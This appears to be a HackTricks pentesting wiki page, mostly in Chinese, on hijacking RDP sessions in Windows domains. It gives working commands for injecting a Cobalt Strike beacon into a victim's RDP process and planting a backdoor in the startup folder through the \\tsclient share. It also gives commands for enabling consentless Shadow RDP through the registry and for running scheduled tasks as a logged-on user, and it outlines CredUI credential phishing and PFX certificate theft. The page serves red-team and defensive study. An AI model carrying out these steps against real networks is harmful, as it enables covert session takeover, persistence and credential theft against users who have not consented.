# RDP Sessions Abuse

{{#include ../../banners/hacktricks-training.md}}

## RDP Process Injection

如果 **external group** 对当前 domain 中的任何一台 **computer** 具有 **RDP access**，**attacker** 就可以 **compromise that computer and wait for him**。

当该用户通过 RDP 访问后，**attacker** 可以 **pivot to that users session**，并滥用其在 external domain 中的权限。
```bash
# Supposing the group "External Users" has RDP access in the current domain
## lets find where they could access
## The easiest way would be with bloodhound, but you could also run:
Get-DomainGPOUserLocalGroupMapping -Identity "External Users" -LocalGroup "Remote Desktop Users" | select -expand ComputerName
#or
Find-DomainLocalGroupMember -GroupName "Remote Desktop Users" | select -expand ComputerName

# Then, compromise the listed machines, and wait til someone from the external domain logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local
## From that beacon you can just run powerview modules interacting with the external domain as that user
```
检查[**此页面中使用其他工具窃取会话的其他方法。**](../../network-services-pentesting/pentesting-rdp.md#session-stealing)

## RDPInception

如果用户通过 **RDP 进入一台计算机**，而**攻击者**正在该计算机上**等待**，攻击者将能够**向用户的 RDP 会话中注入 beacon**；如果**受害者在通过 RDP 访问时挂载了其驱动器**，**攻击者就可以访问该驱动器**。

在这种情况下，你可以通过在**受害者**的**原始计算机**的**startup folder**中写入一个**backdoor**，直接**攻陷**该计算机。
```bash
# Wait til someone logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local

# There's a UNC path called tsclient which has a mount point for every drive that is being shared over RDP.
## \\tsclient\c is the C: drive on the origin machine of the RDP session
beacon> ls \\tsclient\c

Size     Type    Last Modified         Name
----     ----    -------------         ----
dir     02/10/2021 04:11:30   $Recycle.Bin
dir     02/10/2021 03:23:44   Boot
dir     02/20/2021 10:15:23   Config.Msi
dir     10/18/2016 01:59:39   Documents and Settings
[...]

# Upload backdoor to startup folder
beacon> cd \\tsclient\c\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
beacon> upload C:\Payloads\pivot.exe
```
## Shadow RDP

如果你是目标主机上的 **local admin**，且受害者已经拥有一个**活动的 RDP 会话**，你可能无需窃取密码或转储 LSASS，就能**查看/控制该桌面**。<sup>[[1]](#references)</sup>

这取决于存储在以下位置的 **Remote Desktop Services shadowing** policy：<sup>[[2]](#references)[[3]](#references)</sup>
```text
HKLM\Software\Policies\Microsoft\Windows NT\Terminal Services\Shadow
```
有趣的值：

- `0`：禁用
- `1`：`EnableInputNotify`（控制，需要用户批准）
- `2`：`EnableInputNoNotify`（控制，**无需用户批准**）
- `3`：`EnableNoInputNotify`（仅查看，需要用户批准）
- `4`：`EnableNoInputNoNotify`（仅查看，**无需用户批准**）
```cmd
:: Check the policy
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow

:: Enable interaction without consent
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 2 /f

:: Enumerate sessions and shadow the target one
quser /server:<HOST>
mstsc /v:<HOST> /shadow:<SESSION_ID> /control /noconsentprompt /prompt
```
当通过 RDP 连接的特权用户留下未锁定的桌面、KeePass 会话、MMC 控制台、浏览器会话或已打开的 admin shell 时，这尤其有用。

## Scheduled Tasks As Logged-On User

如果你是 **local admin**，且目标用户**当前已登录**，Task Scheduler 可以在**无需其密码**的情况下，以该用户身份启动代码。<sup>[[1]](#references)[[4]](#references)</sup>

这会将受害者现有的登录会话变成一个执行原语：
```cmd
schtasks /create /S <HOST> /RU "<DOMAIN\\user>" /SC ONCE /ST 00:00 /TN "Updater" /TR "cmd.exe /c whoami > C:\\Windows\\Temp\\whoami.txt"
schtasks /run /S <HOST> /TN "Updater"
```
注意：

- 如果用户**未登录**，Windows 通常要求提供密码，才能创建一个以该用户身份运行的任务。
- 如果用户**已登录**，任务可以复用现有的登录上下文。
- 这是一种在不接触 LSASS 的情况下，在受害者会话中执行 GUI 操作或启动二进制文件的实用方法。

## 在受害者会话中滥用 CredUI Prompt

一旦可以在**受害者的交互式桌面内**执行代码（例如通过 **Shadow RDP** 或**以该用户身份运行的 scheduled task**），就可以使用 CredUI APIs 显示一个**真实的 Windows credential prompt**，并收集受害者输入的凭据。<sup>[[1]](#references)</sup>

相关 APIs：

- `CredUIPromptForWindowsCredentials`
- `CredUnPackAuthenticationBuffer`

典型流程：

1. 在受害者会话中启动一个二进制文件。
2. 显示一个与当前 domain branding 匹配的 domain-authentication prompt。
3. 解包返回的 auth buffer。
4. 验证提供的凭据，并可选择持续提示，直到输入有效凭据。

这对于**on-host phishing** 很有用，因为该 prompt 是由标准 Windows APIs 渲染的，而不是伪造的 HTML 表单。

## 在受害者上下文中请求 PFX

同一个 **scheduled-task-as-user** primitive 可用于以已登录受害者的身份请求 **certificate/PFX**。之后可以使用该 certificate 以该用户身份进行 **AD authentication**，从而完全避免窃取密码。<sup>[[1]](#references)[[5]](#references)</sup>

高级流程：

1. 在受害者已登录的主机上获得**local admin**权限。
2. 使用 **scheduled task** 以受害者身份运行 enrollment/export logic。
3. 导出生成的 **PFX**。
4. 使用 PFX 进行 PKINIT / 基于 certificate 的 AD authentication。

有关后续 abuse，请参阅 AD CS 页面：

{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

## References

- [1] [SensePost - From flat networks to locked up domains with tiering models](https://sensepost.com/blog/2026/from-flat-networks-to-locked-up-domains-with-tiering-models/)
- [2] [Microsoft - Remote Desktop shadow](https://learn.microsoft.com/windows/win32/termserv/remote-desktop-shadow)
- [3] [NetExec - Shadow RDP plugin PR #465](https://github.com/Pennyw0rth/NetExec/pull/465)
- [4] [NetExec - schtask_as module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/schtask_as.py)
- [5] [NetExec - Request PFX via scheduled task PR #908](https://github.com/Pennyw0rth/NetExec/pull/908)

{{#include ../../banners/hacktricks-training.md}}
